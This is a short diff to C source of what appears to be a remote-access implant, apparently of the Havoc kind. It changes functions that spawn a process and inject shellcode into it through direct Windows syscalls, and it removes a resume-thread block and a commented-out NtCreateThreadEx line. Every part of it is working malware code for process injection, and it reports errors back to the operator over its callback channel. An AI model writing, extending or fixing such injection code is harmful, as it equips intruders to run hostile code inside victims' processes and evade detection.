@@ -146,21 +146,7 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                 if ( ProcessCreate( TRUE, NULL, Instance->Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
                 {
                     ctx->hProcess = ProcessInfo.hProcess;
-                    if ( ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx ) == ERROR_SUCCESS )
-                    {
-                        NtStatus = Instance->Syscall.NtResumeThread( ProcessInfo.hThread, NULL );
-                        if ( ! NT_SUCCESS( NtStatus ) )
-                        {
-                            PUTS( "[-] NtResumeThread: Failed" );
-                            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-                        }
-                        else
-                        PUTS( "[+] NtResumeThread: Success" );
-
-                        return TRUE;
-                    }
-                    else
-                        return FALSE;
+                    return ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
                 }
                 break;
             }
@@ -224,8 +210,6 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
     else
         PUTS("[+] NtProtectVirtualMemory: Successful")
 
-    // NtStatus = Instance->Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, lpVirtualMemory, ShellcodeArg, FALSE, NULL, NULL, NULL, NULL );
-
     ctx->Parameter = ShellcodeArg;
     if ( ThreadCreate( DX_THREAD_SYSCALL, ctx->hProcess, lpVirtualMemory, ctx ) )
     {
@@ -241,6 +225,8 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
 End:
     if ( ! Success )
         PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+
+    PRINTF( "Success: %s\n", Success ? "TRUE" : "FALSE" )
 
     return Success;
 }
